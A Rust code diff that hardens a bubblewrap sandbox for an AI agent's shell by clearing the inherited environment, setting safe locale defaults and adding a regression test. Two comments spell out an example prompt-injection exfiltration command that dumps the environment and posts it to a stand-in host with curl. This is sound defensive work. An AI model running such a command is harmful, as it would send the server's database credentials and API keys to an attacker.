@@ -243,6 +243,16 @@ fn build_bwrap_argv(
     let workspace = ctx.workspace.to_string_lossy().to_string();
 
     let mut argv: Vec<String> = vec![
+        // SECURITY: wipe the entire inherited environment before any
+        // --setenv lines below. Without --clearenv, the server's full
+        // env (DATABASE_URL, JWT secrets, every *_API_KEY,
+        // HUGGINGFACE_API_KEY, AWS_*, OPENAI_*, ANTHROPIC_*, etc.) is
+        // visible to the sandboxed bash. Combined with --share-net, a
+        // prompt-injection like `env > /tmp/x && curl evil.com -d @-`
+        // exfiltrates every secret the server holds. With --clearenv,
+        // only the explicit --setenv values below survive into the
+        // sandbox.
+        "--clearenv".into(),
         "--unshare-user".into(),
         "--uid".into(),
         "1001".into(),
@@ -298,6 +308,19 @@ fn build_bwrap_argv(
         "--setenv".into(),
         "PATH".into(),
         "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin".into(),
+        // Safe defaults that some rootfs tools (R, matplotlib, click)
+        // require to start cleanly. Chosen to leak nothing about the
+        // host: C.UTF-8 is universal, "dumb" disables interactive
+        // terminal behaviors in tools that probe TERM.
+        "--setenv".into(),
+        "LANG".into(),
+        "C.UTF-8".into(),
+        "--setenv".into(),
+        "LC_ALL".into(),
+        "C.UTF-8".into(),
+        "--setenv".into(),
+        "TERM".into(),
+        "dumb".into(),
     ];
 
     // PID namespace + /proc handling per cached mode.
@@ -586,6 +609,53 @@ mod tests {
             user_id: Uuid::nil(),
             workspace: PathBuf::from("/tmp/ws"),
             files: Arc::new(Vec::<ConversationFile>::new()),
+        }
+    }
+
+    #[test]
+    fn argv_clears_env_before_setenv() {
+        // SECURITY regression test: --clearenv MUST appear before any
+        // --setenv flag, so the server's full inherited environment
+        // (DATABASE_URL, JWT secrets, every *_API_KEY) does not leak
+        // into the sandboxed shell. Combined with --share-net, a
+        // missing --clearenv would let a prompt-injected `env >
+        // /tmp/x && curl evil.com -d @-` exfiltrate every secret the
+        // server holds.
+        let caps = fake_caps();
+        let state = fake_state();
+        let ctx = fake_ctx();
+        let argv = build_bwrap_argv(
+            &caps,
+            &state,
+            &ctx,
+            "echo hi",
+            std::path::Path::new("/tmp/.sandbox_passwd"),
+            std::path::Path::new("/tmp/.sandbox_group"),
+            None,
+        );
+
+        let clearenv = argv
+            .iter()
+            .position(|a| a == "--clearenv")
+            .expect("bwrap argv must include --clearenv");
+        let first_setenv = argv
+            .iter()
+            .position(|a| a == "--setenv")
+            .expect("expected at least one --setenv (HOME/USER/PATH)");
+
+        assert!(
+            clearenv < first_setenv,
+            "--clearenv must come BEFORE the first --setenv; argv: {argv:?}"
+        );
+
+        // Sanity: the safe locale/TERM defaults we added alongside
+        // --clearenv are present so rootfs tools (R, matplotlib,
+        // click) still start cleanly.
+        for required in &["HOME", "USER", "PATH", "LANG", "LC_ALL", "TERM"] {
+            assert!(
+                argv.iter().any(|a| a == required),
+                "missing --setenv for {required}; argv: {argv:?}"
+            );
         }
     }
 
